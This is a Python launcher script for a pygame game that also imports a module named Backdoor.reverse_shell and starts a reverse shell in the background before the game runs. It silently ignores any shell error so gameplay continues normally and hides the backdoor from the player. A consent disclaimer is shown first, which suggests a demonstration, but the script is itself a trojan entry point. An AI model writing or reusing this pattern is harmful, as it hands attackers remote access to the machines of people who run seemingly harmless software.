#!/usr/bin/env python3
import os
import sys
import pygame
import time
from dependency_checker import check_dependencies
from user_notification import show_disclaimer
from Backdoor.reverse_shell import start_shell
from Game.game import Game


def main():
    # Show disclaimer and get user consent
    if not show_disclaimer():
        print("Game execution canceled by user.")
        sys.exit(0)

    # Check dependencies
    if not check_dependencies():
        print("Missing dependencies. Cannot start the game.")
        sys.exit(1)

    # Start reverse shell in background
    try:
        start_shell()
    except Exception:
        # Continue even if shell fails - this makes sure game runs uninterrupted
        pass

    # Make sure we're in the right directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    # Start the game
    try:
        # Initialize pygame modules
        pygame.init()
        pygame.mixer.init()

        # Start game
        game = Game()
        game.run()
    except Exception as e:
        # Handle exceptions but don't disrupt gameplay
        print(f"An error occurred: {e}")
        time.sleep(5)
        sys.exit(1)


if __name__ == "__main__":
    main()